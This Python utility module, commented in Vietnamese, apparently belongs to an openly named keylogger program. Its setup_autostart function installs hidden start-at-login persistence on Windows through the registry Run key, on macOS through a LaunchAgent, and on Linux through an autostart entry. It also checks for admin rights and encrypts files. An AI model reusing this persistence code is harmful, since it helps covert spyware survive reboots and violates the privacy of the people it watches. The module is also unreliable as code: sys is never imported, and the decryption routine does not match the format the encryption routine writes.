#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module chứa các tiện ích dùng chung cho ứng dụng
"""

import os
import base64
import logging
import platform
import subprocess
from typing import Optional, List, Dict, Any, Union

# Thiết lập logger
logger = logging.getLogger("keylogger.utils")

def is_admin() -> bool:
    """Kiểm tra xem ứng dụng có đang chạy với quyền admin hay không.
    
    Returns:
        bool: True nếu đang chạy với quyền admin, False nếu không
    """
    try:
        system = platform.system()
        if system == "Windows":
            try:
                # Thử tạo file trong thư mục system32 để kiểm tra quyền admin
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        elif system in ["Linux", "Darwin"]:  # Linux hoặc macOS
            return os.geteuid() == 0
        return False
    except Exception as e:
        logger.error(f"Lỗi khi kiểm tra quyền admin: {e}")
        return False

def encrypt_file(file_path: str, password: Optional[str] = None) -> bool:
    """Mã hóa file với mật khẩu (tùy chọn).
    
    Args:
        file_path: Đường dẫn file cần mã hóa
        password: Mật khẩu mã hóa (tùy chọn)
    
    Returns:
        bool: True nếu mã hóa thành công, False nếu thất bại
    """
    try:
        from cryptography.fernet import Fernet
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        
        # Đọc nội dung file
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Tạo key dựa trên password hoặc tạo key ngẫu nhiên
        if password:
            # Tạo key từ password
            salt = os.urandom(16)
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
            # Lưu salt vào đầu file để giải mã sau này
            prefix = base64.urlsafe_b64encode(salt) + b':1:'  # 1: sử dụng PBKDF2
        else:
            # Tạo key ngẫu nhiên
            key = Fernet.generate_key()
            prefix = b'0:'  # 0: sử dụng key ngẫu nhiên
        
        # Mã hóa
        cipher = Fernet(key)
        encrypted_data = cipher.encrypt(data)
        
        # Thêm prefix chứa thông tin để giải mã sau này
        final_data = prefix + key + b':' + encrypted_data
        
        # Ghi lại vào file
        with open(file_path, 'wb') as f:
            f.write(final_data)
        
        logger.info(f"Đã mã hóa file: {file_path}")
        return True
    
    except Exception as e:
        logger.error(f"Lỗi khi mã hóa file {file_path}: {e}")
        return False

def decrypt_file(file_path: str, password: Optional[str] = None) -> bool:
    """Giải mã file đã được mã hóa.
    
    Args:
        file_path: Đường dẫn file cần giải mã
        password: Mật khẩu giải mã (nếu file được mã hóa với mật khẩu)
    
    Returns:
        bool: True nếu giải mã thành công, False nếu thất bại
    """
    try:
        from cryptography.fernet import Fernet
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        
        # Đọc nội dung file
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Phân tích định dạng
        parts = data.split(b':', 3)
        
        if len(parts) < 3:
            logger.error(f"File {file_path} không phải là file đã mã hóa hợp lệ")
            return False
        
        method = parts[0]
        
        if method == b'0':
            # Sử dụng key ngẫu nhiên
            key = parts[1]
            encrypted_data = parts[2]
        elif method == b'1':
            # Sử dụng password
            if not password:
                logger.error("Cần mật khẩu để giải mã file này")
                return False
            
            salt = base64.urlsafe_b64decode(parts[0])
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
            encrypted_data = parts[2]
        else:
            logger.error(f"Phương thức mã hóa không được hỗ trợ: {method}")
            return False
        
        # Giải mã
        cipher = Fernet(key)
        decrypted_data = cipher.decrypt(encrypted_data)
        
        # Ghi lại vào file
        with open(file_path, 'wb') as f:
            f.write(decrypted_data)
        
        logger.info(f"Đã giải mã file: {file_path}")
        return True
    
    except Exception as e:
        logger.error(f"Lỗi khi giải mã file {file_path}: {e}")
        return False

def open_file(filepath: str) -> bool:
    """Mở file bằng ứng dụng mặc định của hệ thống.
    
    Args:
        filepath: Đường dẫn file cần mở
    
    Returns:
        bool: True nếu mở thành công, False nếu thất bại
    """
    try:
        system = platform.system()
        
        if system == "Windows":
            os.startfile(filepath)
        elif system == "Darwin":  # macOS
            subprocess.call(["open", filepath])
        else:  # Linux
            subprocess.call(["xdg-open", filepath])
        
        return True
    except Exception as e:
        logger.error(f"Lỗi khi mở file {filepath}: {e}")
        return False

def check_required_packages(packages: List[str]) -> List[str]:
    """Kiểm tra các package cần thiết và trả về danh sách thiếu.
    
    Args:
        packages: Danh sách các package cần kiểm tra
    
    Returns:
        List[str]: Danh sách các package chưa được cài đặt
    """
    missing_packages = []
    
    for package in packages:
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(package)
    
    return missing_packages

def install_packages(packages: List[str]) -> bool:
    """Cài đặt các package thiếu.
    
    Args:
        packages: Danh sách các package cần cài đặt
    
    Returns:
        bool: True nếu cài đặt thành công, False nếu thất bại
    """
    try:
        for pkg in packages:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pkg],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
        return True
    except Exception as e:
        logger.error(f"Lỗi khi cài đặt package: {e}")
        return False

def setup_autostart(app_path: str, hidden: bool = False) -> bool:
    """Thiết lập ứng dụng tự khởi động cùng hệ thống.
    
    Args:
        app_path: Đường dẫn đến file thực thi của ứng dụng
        hidden: True nếu muốn ẩn cửa sổ khi khởi động
    
    Returns:
        bool: True nếu thiết lập thành công, False nếu thất bại
    """
    try:
        system = platform.system()
        
        if system == "Windows":
            import winreg
            
            key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            
            try:
                # Mở registry key
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                
                # Chuẩn bị command
                command = f'"{app_path}"'
                if hidden:
                    command = f'"{sys.executable}" -m pythonw "{app_path}"'
                
                # Thêm entry vào registry
                winreg.SetValueEx(key, "KeyloggerApp", 0, winreg.REG_SZ, command)
                winreg.CloseKey(key)
                
                logger.info(f"Đã thiết lập tự khởi động cho Windows: {command}")
                return True
            except Exception as e:
                logger.error(f"Lỗi khi thiết lập tự khởi động cho Windows: {e}")
                return False
                
        elif system == "Darwin":  # macOS
            # Tạo file plist trong ~/Library/LaunchAgents
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.keylogger.app.plist")
            
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.keylogger.app</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{app_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
    <key>StandardOutPath</key>
    <string>/tmp/keylogger.stdout.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/keylogger.stderr.log</string>
</dict>
</plist>'''
            
            try:
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                
                # Load plist
                os.system(f"launchctl load {plist_path}")
                logger.info(f"Đã thiết lập tự khởi động cho macOS: {plist_path}")
                return True
            except Exception as e:
                logger.error(f"Lỗi khi thiết lập tự khởi động cho macOS: {e}")
                return False
                
        elif system == "Linux":
            # Tạo desktop file trong ~/.config/autostart
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            
            desktop_path = os.path.join(autostart_dir, "keylogger.desktop")
            
            app_name = os.path.basename(app_path)
            desktop_content = f'''[Desktop Entry]
Type=Application
Name=KeyloggerApp
Exec={sys.executable} {app_path}
Hidden={"true" if hidden else "false"}
NoDisplay={"true" if hidden else "false"}
X-GNOME-Autostart-enabled=true
'''
            
            try:
                with open(desktop_path, "w") as f:
                    f.write(desktop_content)
                
                # Cập nhật quyền
                os.chmod(desktop_path, 0o744)
                logger.info(f"Đã thiết lập tự khởi động cho Linux: {desktop_path}")
                return True
            except Exception as e:
                logger.error(f"Lỗi khi thiết lập tự khởi động cho Linux: {e}")
                return False
        
        return False
    except Exception as e:
        logger.error(f"Lỗi khi thiết lập tự khởi động: {e}")
        return False